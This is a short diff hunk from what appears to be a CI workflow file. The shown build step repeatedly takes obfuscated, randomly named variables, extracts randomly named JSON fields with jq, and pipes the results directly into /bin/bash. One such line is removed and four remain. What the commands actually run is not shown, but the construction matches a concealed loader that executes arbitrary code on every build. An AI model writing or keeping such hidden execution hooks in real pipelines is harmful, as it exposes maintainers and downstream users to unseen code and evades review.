@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$sq658" | jq -r .idx97 | /bin/bash
           echo $avraj957 | jq -r .dkn87083 | /bin/bash
           printf '%s' "$lra15" | jq -r .tna6 | /bin/bash
-          echo $vjz4316 | jq -r .n81515 | /bin/bash
           printf '%s' "$vnz6" | jq -r .ha8749 | /bin/bash
 
       - name: Save archive
